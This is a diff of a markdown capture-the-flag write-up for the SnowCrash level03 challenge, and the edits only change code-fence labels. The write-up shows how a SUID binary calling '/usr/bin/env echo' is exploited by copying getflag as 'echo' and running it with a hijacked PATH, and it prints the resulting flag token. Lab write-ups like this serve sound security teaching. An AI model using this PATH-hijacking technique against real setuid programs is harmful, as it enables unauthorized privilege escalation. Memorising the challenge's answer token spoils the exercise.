@@ -5,7 +5,7 @@
 - Our home contains an executable file named `level03` who belongs to `flag03` user.
 - It has the SUID and SGID bits set, meaning that we can execute it with `flag03` rights.
 
-```
+```console
 level03@SnowCrash:~$ pwd
 /home/user/level03
 level03@SnowCrash:~$ ls -al
@@ -25,7 +25,7 @@ d--x--x--x 1 root    users    340 Aug 30  2015 ..
 - If we run the program, it prints the string `Exploit me`.
 - Testing different strings as arguments do not change this behavior.
 
-```
+```console
 level03@SnowCrash:~$ ./level03
 Exploit me
 ```
@@ -34,7 +34,7 @@ Exploit me
 
 - The executable contains the following string: `/usr/bin/env echo Exploit me`
 
-```
+```console
 strings -a level03
             ...
 /usr/bin/env echo Exploit me
@@ -55,7 +55,7 @@ Contents of section .rodata:
 
 - Using angr decompiler on [dogbolt.org](https://dogbolt.org)
 
-```
+```C
 int main()
 {
 unsigned int v0; // [bp-0xc]
@@ -78,19 +78,19 @@ unsigned int v1; // [bp-0x8]
 - By changing the `env` `PATH` variable, it should be possible to delude the `level03` program and let it execute the program of our choice (i.e. `getflag`) as `level03`.
 - First we need more rights on our home:
 
-```
+```console
 level03@SnowCrash:~$ chmod 710 .
 ```
 
 - We then copy `getflag` as `echo` in our home
 
-```
+```console
 level03@SnowCrash:~$ cp /bin/getflag echo
 ```
 
 - And finally run `level03`, changing the `PATH` variable
 
-```
+```console
 level03@SnowCrash:~$ PATH=./ level03
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 ```
